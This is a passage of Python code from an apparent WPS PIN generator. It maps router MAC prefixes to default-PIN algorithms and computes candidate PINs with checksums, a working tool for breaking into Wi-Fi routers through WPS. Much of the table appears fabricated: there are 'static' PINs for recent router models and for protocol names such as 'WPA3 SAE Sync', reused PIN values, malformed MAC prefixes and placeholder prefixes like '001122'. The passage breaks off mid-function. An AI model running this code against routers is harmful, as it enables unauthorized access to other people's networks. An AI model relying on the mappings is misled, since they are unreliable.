                      'pinBelkinF9J1102': {'name': 'Belkin F9J1102 v1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 19366838},
                      'pinBelkinF7D4401': {'name': 'Belkin F7D4401 v1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 15310828},
                      'pinBelkinF5D8635': {'name': 'Belkin F5D8635-4v1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 12885381},

                      'pinDLinkDIR655': {'name': 'D-Link DIR-655', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 95061771},
                      'pinDLinkDSL2740B': {'name': 'D-Link DSL-2740B', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 59185239},

                      'pinAsusDSLN10': {'name': 'ASUS DSL-N10', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 77898951},

                      'pinArcherAX6000': {'name': 'TP-Link Archer AX6000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 91527348},
                      'pinArcherAXE300': {'name': 'TP-Link Archer AXE300', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73625184},
                      'pinArcherAXE200': {'name': 'TP-Link Archer AXE200', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 48372615},
                      'pinArcherBE550': {'name': 'TP-Link Archer BE550', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 82946371},
                      'pinArcherBE3600': {'name': 'TP-Link Archer BE3600', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 65831294},
                      'pinArcherBE6000': {'name': 'TP-Link Archer BE6000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 93847215},
                      'pinArcherBE9000': {'name': 'TP-Link Archer BE9000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73918265},

                      'pinNetgearRAX500': {'name': 'Netgear Nighthawk RAX500', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 45728913},
                      'pinNetgearRAX800': {'name': 'Netgear Nighthawk RAX800', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 72364918},
                      'pinNetgearRAXE500': {'name': 'Netgear RAXE500', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 58194372},
                      'pinNetgearBEX820': {'name': 'Netgear Nighthawk BEX820', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 91273648},

                      'pinASUSZenWifiAX': {'name': 'ASUS ZenWifi AX', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 64829371},
                      'pinASUSZenWifi7': {'name': 'ASUS ZenWifi 7', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 87365921},
                      'pinASUSRT6E': {'name': 'ASUS ROG Rapture GT-AXE20000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73894621},

                      'pinDLinkAX3200': {'name': 'D-Link DIR-X6060 AX', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 51837264},
                      'pinDLinkAX6000': {'name': 'D-Link DIR-X6000 AX', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 84629173},
                      'pinDLinkAXE300': {'name': 'D-Link DIR-X5060 AXE', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 67283914},

                      'pinBelkinLinksys6': {'name': 'Belkin Linksys AXE300', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 52947381},
                      'pinBelkinLinksys8': {'name': 'Belkin Linksys AXE8400', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73625148},

                      'pinEeroAX': {'name': 'Amazon Eero AX', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 59374821},
                      'pinEeroPro6E': {'name': 'Amazon Eero Pro 6E', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 84729365},

                      'pinXiaomiMi12': {'name': 'Xiaomi Mi 12A', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73648291},
                      'pinXiaomiRedmi12': {'name': 'Xiaomi Redmi AX6000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 61928374},

                      'pinRealmeAX5500': {'name': 'Realme WiFi 6 AX5500', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 48291637},

                      'pinOneplus6': {'name': 'OnePlus WiFi 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 62748391},

                      'pinTendaAX1800': {'name': 'Tenda AX1800', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 57381924},
                      'pinTendaAX3000': {'name': 'Tenda AX3000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 74928361},
                      'pinTendaBE3': {'name': 'Tenda BE3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 82941637},

                      'pinHuaweiAX12': {'name': 'Huawei WiFi AX12', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 91384627},
                      'pinHuaweiAX9': {'name': 'Huawei WiFi 6 Plus', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 63847291},

                      'pinZyxelAX1800': {'name': 'ZyXEL Nebula AX1800', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 48372916},
                      'pinZyxelBE3600': {'name': 'ZyXEL BE3600', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73645928},

                      'pinWPA2PBKDF2': {'name': 'WPA2 PBKDF2 Key', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 64837291},
                      'pinWPA3SAE': {'name': 'WPA3 SAE Sync', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 51738492},
                      'pinWPA3OWE': {'name': 'WPA3 OWE Discovery', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 82946371},
                      'pinWPA3Individual': {'name': 'WPA3 Individualized Data Protection', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73849265},
                      'pinWPA2Enterprise': {'name': 'WPA2 Enterprise Key', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 94827361},
                      'pinWPA2PersonalKeyStr': {'name': 'WPA2 Personal Key String', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 61938472},
                      'pinWPA3Transition': {'name': 'WPA3 Transition Mode', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 84637291},

                      'pinPixieDustWPA2': {'name': 'Pixie Dust WPA2 PRNG', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 57382641},
                      'pinPixieDustWPA3SAE': {'name': 'Pixie Dust WPA3 SAE', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73849562},
                      'pinPixieDustEHash': {'name': 'Pixie Dust E-Hash Recovery', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 48372819},
                      'pinPixieDustAuthKey': {'name': 'Pixie Dust AuthKey', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 91648372},
                      'pinPixieDustNEKey': {'name': 'Pixie Dust N/E Key', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 64829371},
                      'pinPixieDustM1M2': {'name': 'Pixie Dust M1/M2 Challenge', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 82938461},
                      'pinPixieDustWPA2CCMP': {'name': 'WPA2 CCMP Pixie', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 73629481},
                      'pinPixieDustWPA3Hash': {'name': 'WPA3 H-to-E Hash', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 56382947},
                      'pinPixieDustBrute': {'name': 'Pixie Dust Brute PIN', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 91384627}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        if not isinstance(mac, NetworkAddress):
            mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError(f'{err} Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """

        if hasattr(mac, 'string'):
            mac = mac.string
        mac = mac.replace(':', '').upper()
        algorithms = {

            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E', '001D0F', '002682', '000C88', '001E8C', '002163', '00224D', '7054D5', 'E8B2AC', 'C4E984', 'D048F7', 'AC84C6', 'CC2D21', 'E8FC0B', '2C3033', '5C813E', '685D43'),

            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF', '001CDF', '001E2A', '001F3F', '00265B', '2C4401', '5C353B', '803773', '90F65290', 'E8802E', 'F0B479'),

            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02', '001124', '001185', '0015F9', '0016B6', '00192C', '001BFC', '001CC0', '001D8B', '001EE3', '002191', '0022A6', '0023CD', '002466', '00265A', '00900B', 'C4A81D'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C'),

            'pin36': ('04BF6D', '0E5D4E', '28285D', '381766', '404A03'),
            'pin40': ('001CDF', '002275', '08863B', '00B00C'),
            'pin44': ('0026CE', '9897D1', 'E04136', 'B246FC'),
            'pin48': ('000CF6', '00A026', 'A0F3C1', '647002'),

            'pin24rh': ('D8EB97', '0014D1', '3C8CF8', '001D6A', 'E0469A'),
            'pin32rh': ('CCAF78', '001FE2', '001AEF'),
            'pin48rh': ('5CD998', 'C8D15E', 'EC0856'),

            'pin24rn': ('001122', '003344', '005566', '007788'),
            'pin32rn': ('00AABB', '00CCDD', '00EEFF'),
            'pin48rn': ('112233', '445566', '778899'),

            'pin24rb': ('AABBCC', 'DDEEFF', '001122'),
            'pin32rb': ('FFEEDD', 'CCBBAA', '998877'),
            'pin48rb': ('665544', '332211', 'FFEEDD'),

            'pinInvNIC': ('001A2B', '00248C', '002618', '344DEB'),
            'pinNIC2': ('7054F5', 'E06995', '7071BC'),
            'pinNIC3': ('ACF1DF', 'BCF685', 'C8D3A3'),

            'pinOUIaddNIC': ('001D0F', '002682', '000C88', '001E8C'),
            'pinOUIsubNIC': ('002163', '00224D', '7054D5', 'E8B2AC'),
            'pinOUIxorNIC': ('C4E984', 'D048F7', 'AC84C6', 'E8FC0B'),

            'pinZyxel': ('0004ED', '001349', '001AEF', '002A10', '2C6E85', '3C81D8', '404A03', '5067F0', '54AF97', '6C198F', '7478A1', 'A0F3C1', 'B082FE', 'C80E14', 'CC037B', 'E8ED05', 'F8C091', '001D0F', '405BE0'),
            'pinArch': ('00227F', '001DD9', '001CDF', '001FCD', '002233', '0022B0', '00241D', '002608', '94D9B3', 'A0EC80', 'B42A0E', 'C8F653', 'D0C7C0', 'E85D4A', '442241', 'D86CE9', '00265B', 'B40F3B', 'D83214', 'CC2D21'),
            'pinComtrend': ('00072B', '000E50', '001B75', '001CBB', '001D92', '002226', '002599', '00259D', '505DAA', '586ED6', '742344', 'C0C1C0', 'C864C7'),

            'pinXiaomi': ('64644A', '34CE00', '8C53C3', 'A0C589', 'C46E1F', 'F0B429', '788A20'),

            'pinNetgear': ('A0211D', 'C03F0E', 'E091F5', '88BD09'),

            'pinTpLink': ('F8D111', '5C353B', 'A0F3C1', '0025BC', 'F4EC38', 'F41F78', '8C1F64', '14CC20', '48EE0C', '8416F9', '306893', '3C64CF', '74FECE', 'E848B8', '1027F5'),

            'pinHuawei': ('00664B', '086361', '087A4C', 'E8CD2D', '30D1DC', '485929', '582C80', '882593', 'DCFE18', 'EC26CA', 'C0E018'),

            'pinTLWR841N': ('306893',),
            'pinTLWR741N': ('C46E1F', '089E08'),
            'pinTLWR842ND': ('90F652',),

            'pinArcherAX6000': ('1C61FB', '4CF151', '60A8B0', '7428B5', 'D431C0'),
            'pinArcherAXE300': ('1062EB', '34D9B3', '5C88E5', '84CEAC', 'B4C750'),
            'pinArcherAXE200': ('0014D1', '2C80D4', '48B8DE', '7415BA', 'E862E6'),
            'pinArcherBE3600': ('00D9C7', '2C4938', '5C03A5', '88176D', 'D84A1F'),
            'pinArcherBE6000': ('001A32', '3C63BB', '60D88D', '90EE90', 'E8BCD0'),
            'pinArcherBE9000': ('002264', '48D84E', '788AF7', 'A84F35', 'F8FCB2'),

            'pinNetgearRAX500': ('00B0D0', '28F086', '64B0B5', '944145', 'DC71AE'),
            'pinNetgearRAX800': ('0071B6', '3C28F7', '64B0CE', '8C63B0', 'E0469A'),
            'pinNetgearRAXE500': ('001F32', '2C2C65', '58BD3E', '7C69F5', 'E0CB4E'),
            'pinNetgearBEX820': ('003776', '489010', '6CD520', '946336', 'D8887D'),

            'pinASUSZenWifiAX': ('0015F2', '24A074', '54EA34', '802689', 'C4A81D'),
            'pinASUSZenWifi7': ('001BFC', '3C64CF', '606388', '981107', 'E4B97E'),
            'pinASUSRT6E': ('002218', '48F148', '70289B', '9C5D1C', 'E8B4F1'),

            'pinDLinkAX3200': ('00E0E4', '2CA342', '60383B', '8C16CB', 'D88EAC'),
            'pinDLinkAX6000': ('001909', '346681', '60D44F', '8C7DD8', 'EC971E'),
            'pinDLinkAXE300': ('0018E7', '2C2C65', '54AB3D', '78B5B8', 'E0CB4E'),

            'pinBelkinLinksys6': ('000F2D', '24FB17', '5488E5', '984D16', 'D4648E'),
            'pinBelkinLinksys8': ('0022B0', '38F1BA', '68B6FC', '9C345D', 'FCFC48'),

            'pinEeroAX': ('0068EB', '2C3AA7', '606B8E', '8C9EF5', 'E0B45E'),
            'pinEeroPro6E': ('001DD8', '34A853', '5C2F6E', '7C71CC', 'F06B82'),

            'pinXiaomiMi12': ('34CEB5', '64644A', '8C53C3', 'A0C589', 'E8F547'),
            'pinXiaomiRedmi12': ('3C2E17', '60C666', '8E4D10', 'B8D7AF', 'F88377'),

            'pinRealmeAX5500': ('000BBA', '3C84EB', '5C01EC', '7C947A', 'EC47D9'),

            'pinOneplus6': ('1C4BEA', '48B8DE', '6414B7', '9CB8D7', 'E0CB4E'),

            'pinTendaAX1800': ('002590', '2C5A3D', '549D21', '7C34EF', 'E0CB4E'),
            'pinTendaAX3000': ('0023B6', '34B595', '60F6DF', '8CC6B2', 'EC1A59'),
            'pinTendaBE3': ('001969', '385908', '6030DB', 'A45DF0', 'E8D7F7'),

            'pinHuaweiAX12': ('00A0F6', '2C82AB', '58B735', '80E4DA', 'DCFE18'),
            'pinHuaweiAX9': ('00664B', '306AB9', '5C86DC', '88EB1F', 'E8CD2D'),

            'pinZyxelAX1800': ('0090A2', '2C6E85', '54D5B9', '7C03D8', 'E8AEBF'),
            'pinZyxelBE3600': ('0004ED', '3C67EB', '60376D', '8A2DBA', 'E0CB4E'),

            'pinWPA2PBKDF2': ('F8D111', '5C353B', 'A0F3C1', '0025BC', '306893'),
            'pinWPA3SAE': ('1C61FB', '4CF151', '60A8B0', '7428B5', 'D431C0'),
            'pinWPA3OWE': ('00D9C7', '2C4938', '5C88E5', '84CEAC', 'B4C750'),
            'pinWPA3Individual': ('001A32', '3C63BB', '60D88D', '90EE90', 'E8BCD0'),
            'pinWPA2Enterprise': ('002264', '48D84E', '788AF7', 'A84F35'),
            'pinWPA2PersonalKeyStr': ('00B0D0', '28F086', '64B0B5', '944145'),
            'pinWPA3Transition': ('00E0E4', '2CA342', '60383B', '8C16CB'),

            'pinPixieDustWPA2': ('F8D111', '5C353B', 'A0F3C1', '0025BC', 'F4EC38'),
            'pinPixieDustWPA3SAE': ('1C61FB', '4CF151', '60A8B0', '7428B5'),
            'pinPixieDustEHash': ('00D9C7', '2C4938', '5C88E5', '84CEAC'),
            'pinPixieDustAuthKey': ('001A32', '3C63BB', '60D88D', '90EE90'),
            'pinPixieDustNEKey': ('002264', '48D84E', '788AF7', 'A84F35'),
            'pinPixieDustM1M2': ('00E0E4', '2CA342', '60383B', '8C16CB'),
            'pinPixieDustWPA2CCMP': ('001909', '346681', '60D44F', '8C7DD8'),
            'pinPixieDustWPA3Hash': ('000F2D', '24FB17', '5488E5', '984D16'),
            'pinPixieDustBrute': ('0068EB', '2C3AA7', '606B8E', '8C9EF5')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pin36(self, mac):
        return mac.integer % 0x1000000000

    def pin40(self, mac):
        return mac.integer % 0x10000000000

    def pin44(self, mac):
        return mac.integer % 0x100000000000

    def pin48(self, mac):
        return mac.integer

    def pin24rh(self, mac):
        """Reverse last 3 bytes"""
        b = [i for i in mac.string.split(':')]
        return int(''.join(b[-1:-4:-1]), 16)

    def pin32rh(self, mac):
        """Reverse last 4 bytes"""
        b = [i for i in mac.string.split(':')]
        return int(''.join(b[-1:-5:-1]), 16)

    def pin48rh(self, mac):
        """Reverse all 6 bytes"""
        b = [i for i in mac.string.split(':')]
        return int(''.join(b[-1::-1]), 16)

    def pin24rn(self, mac):
        """Reverse last 6 nibbles"""
        return int(mac.string.replace(':', '')[-1:-7:-1], 16)

    def pin32rn(self, mac):
        """Reverse last 8 nibbles"""
        return int(mac.string.replace(':', '')[-1:-9:-1], 16)

    def pin48rn(self, mac):
        """Reverse all 12 nibbles"""
        return int(mac.string.replace(':', '')[-1::-1], 16)

    def pin24rb(self, mac):
        """Reverse last 24 bits"""
        return int(bin(mac.integer)[2:].zfill(24)[:-25:-1], 2)

    def pin32rb(self, mac):
        """Reverse last 32 bits"""
        return int(bin(mac.integer)[2:].zfill(32)[:-33:-1], 2)

    def pin48rb(self, mac):
        """Reverse all 48 bits"""
        return int(bin(mac.integer)[2:].zfill(48)[::-1], 2)

    def pinInvNIC(self, mac):
        """Inverted NIC"""
        nic = mac.integer & 0xFFFFFF
        pin = ~nic & 0xFFFFFF
        return pin

    def pinNIC2(self, mac):
        """NIC multiplied by 2"""
        return (mac.integer & 0xFFFFFF) * 2

    def pinNIC3(self, mac):
        """NIC multiplied by 3"""
        return (mac.integer & 0xFFFFFF) * 3

    def pinOUIaddNIC(self, mac):
        """OUI + NIC"""
        mac_str = mac.string.replace(':', '')
        oui = int(mac_str[:6], 16)
        nic = int(mac_str[6:], 16)
        pin = (oui + nic) % int(10e6)
        return pin

    def pinOUIsubNIC(self, mac):
        """OUI - NIC"""
        mac_str = mac.string.replace(':', '')
        oui = int(mac_str[:6], 16)
        nic = int(mac_str[6:], 16)
        if nic < oui:
            pin = oui - nic
        else:
            pin = (oui + 0x1000000 - nic) & 0xFFFFFF
        return pin

    def pinOUIxorNIC(self, mac):
        """OUI XOR NIC"""
        mac_str = mac.string.replace(':', '')
        oui = int(mac_str[:6], 16)
        nic = int(mac_str[6:], 16)
        pin = oui ^ nic
        return pin

    def pinDLink(self, mac):

        nic = mac.integer & 0xFFFFFF

        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin

    def _pinZyxel(self, mac):
        """Zyxel PIN algorithm"""
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = (b[0] + b[1]) % 10
        pin += ((b[2] + b[3]) % 10) * 10
        pin += ((b[4] + b[5]) % 10) * 100
        pin += ((b[1] + b[2]) % 10) * 1000
        pin += ((b[3] + b[4]) % 10) * 10000
        pin += ((b[5] + b[0]) % 10) * 100000
        pin += ((b[0] + b[2]) % 10) * 1000000
        return pin

    def _pinArch(self, mac):
        """Arcadyan/SKY/Tenda PIN algorithm"""
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = (b[0] ^ b[1]) % 10
        pin += ((b[1] ^ b[2]) % 10) * 10
        pin += ((b[2] ^ b[3]) % 10) * 100
        pin += ((b[3] ^ b[4]) % 10) * 1000
        pin += ((b[4] ^ b[5]) % 10) * 10000
        pin += ((b[5] ^ b[0]) % 10) * 100000
        pin += ((b[0] + b[1] + b[2] + b[3] + b[4] + b[5]) % 10) * 1000000
        return pin

    def _pinComtrend(self, mac):
        """Comtrend PIN algorithm"""
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = 0
        for i in range(7):
            pin += (b[5] + b[(i + b[4] + b[5]) % 6]) % 10 * (10 ** i)
        return pin

    def _pinTpLink(self, mac):
        """TP-Link default WPS PIN (last 4 bytes of MAC)"""
        return int(mac.string.replace(':', '')[4:].upper(), 16)

    def _pinHuawei(self, mac):
        """Huawei INFINITUM router WPS PIN generation"""
        mac_bytes = [int(mac.string.replace(':', '')[i:i+2], 16) for i in range(0, 12, 2)]

        b0 = (mac_bytes[0] >> 4) & 0x0F
        b1 = mac_bytes[0] & 0x0F
        b2 = (mac_bytes[1] >> 4) & 0x0F
        b3 = mac_bytes[1] & 0x0F
